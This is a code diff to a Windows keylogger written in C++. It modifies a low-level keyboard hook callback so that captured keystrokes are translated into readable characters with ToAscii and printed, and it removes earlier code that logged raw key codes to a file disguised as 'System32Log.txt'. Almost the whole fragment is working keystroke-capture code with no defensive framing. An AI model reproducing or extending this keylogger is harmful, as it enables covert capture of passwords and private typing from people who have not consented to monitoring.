@@ -29,35 +29,48 @@ bool ctrlKeyPressed = false;
 bool shiftKeyPressed = false;
 bool capsLockKey = false;
 
+PBYTE keyboardBuffer;
+
+BOOL keyDown(int key) 
+{
+	return (GetAsyncKeyState(key) & 0x8000) != 0;
+}
+
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
+
     if (nCode >= HC_ACTION)
     {
-        shiftKeyPressed =
-            GetKeyState(VK_LSHIFT) & 0x0001 != 0 ||
-            GetKeyState(VK_RSHIFT) & 0x0001 != 0 ||
-            GetKeyState(VK_SHIFT) & 0x0001 != 0;
+		shiftKeyPressed = keyDown(VK_RSHIFT) || keyDown(VK_LSHIFT) || keyDown(VK_SHIFT);
 
-        ctrlKeyPressed =
-            GetKeyState(VK_LCONTROL) & 0x0001 != 0 ||
-            GetKeyState(VK_RCONTROL) & 0x0001 != 0 ||
-            GetKeyState(VK_CONTROL) & 0x0001 != 0;
-        // KeyDown event
-        if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
-        {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+		ctrlKeyPressed = keyDown(VK_RCONTROL) || keyDown(VK_LCONTROL) || keyDown(VK_CONTROL);
 
-            const char* fileName = "System32Log.txt";
-            // save to file
-            Save((unsigned int)kbdStruct.vkCode, fileName);
-        }
-        // KeyUp Event. Needed for context characters
-        else if (wParam == WM_SYSKEYUP || wParam == WM_KEYUP) {
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+			BYTE keyState[256] = {};
+			WORD chars;
+			KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
+			GetKeyState(0);
+			GetKeyboardState(keyState);
+			if (ToAscii(key->vkCode, key->scanCode, keyState, &chars, 0))
+			{
+				std::string toWrite = "";
+				switch ((unsigned char)chars)
+				{
+				case '\b':
+					toWrite = "[BACKSPACE]";
+					break;
+				case '\r':
+					toWrite = "\n";
+					break;
+				default:
+					toWrite = chars;
+				}
+				std::cout << toWrite.c_str();
+			}
+		}
 
-        }
     }
 
     // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
